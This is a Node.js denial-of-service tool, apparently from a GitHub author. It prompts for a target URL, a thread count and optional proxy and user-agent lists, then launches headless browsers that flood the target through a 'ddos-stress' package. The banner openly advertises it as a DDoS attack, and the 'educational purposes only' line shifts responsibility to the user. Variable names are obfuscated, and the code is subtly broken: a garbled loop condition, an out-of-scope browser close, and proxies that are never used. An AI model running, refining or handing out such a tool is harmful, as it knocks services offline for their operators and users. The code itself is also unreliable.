const fs = require('fs');
const prompt = require('prompt-sync')();
const stresss = require("ddos-stress");
const puppeteer = require('puppeteer');

function sanitizeUserAgent(userAgent) {
  return userAgent.replace(/[^a-zA-Z0-9]+/g, '');
}

async function start() {
  console.log("                          ███████╗██████╗   ██████╗ ███████╗");
  console.log("                          ╚══███╔╝██╔══██╗ ██╔═══██╗╚══███╔╝");
  console.log("                            ███╔╝ ██║  ██║ ██║   ██║  ███╔╝ ");
  console.log("                           ███╔╝  ██║  ██║ ██║   ██║ ███╔╝  ");
  console.log("                          ███████╗██████╔╝ ╚██████╔╝███████╗");
  console.log("                          ╚══════╝╚═════╝   ╚═════╝ ╚══════╝");
  console.log("                          Simple but effective ddos attack");
  console.log(" ");
  console.log("     Author: https://github.com/Reloxe/");
  console.log(" ");
  console.log("     Made for educational purposes only. All responsibility belongs to the user!");
  console.log(" ");

  let _0xaf3ex5 = prompt("  URL > ");
  console.log(" ");
  let _0xaf3ex6 = prompt("  ThreadsCount (Recommend: 500) > ");
  console.log(" ");
  let _0xaf3ex7 = prompt("  Proxy file (optional) > ");
  let _0xaf3ex8 = prompt("  User agent file (optional) > ");

  let proxies = [];
  let userAgents = [];

  if (_0xaf3ex7) {
    const lines = fs.readFileSync(_0xaf3ex7, 'utf8').split('\n');
    lines.forEach(line => {
      if (line.trim()) {
        proxies.push(line.trim());
      }
    });
  }

  if (_0xaf3ex8) {
    const lines = fs.readFileSync(_0xaf3ex8, 'utf8').split('\n');
    lines.forEach(line => {
      if (line.trim()) {
        userAgents.push(sanitizeUserAgent(line.trim()));
      }
    });
  }

  let _0xaf3ex9 = proxies.length > 0 ? proxies[0] : "";
  let _0xaf3exa = userAgents.length > 0 ? userAgents[0] : "";

  for (let i = 1; i <= parseInt(_0xaf3ex6) || _0xaf3ex6 === "" ? 4 : _0xaf3ex6; i++) {
    const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] });
    const page = await browser.newPage();
    page.setUserAgent(_0xaf3exa);

    if (_0xaf3ex9) {
      _0xaf3ex9 = proxies.shift();
    }

    let _0xaf3exb = new stresss;
    _0xaf3exb.run(_0xaf3ex5, _0xaf3ex6, page);

    await page.close();
  }

  await browser.close();
}

start();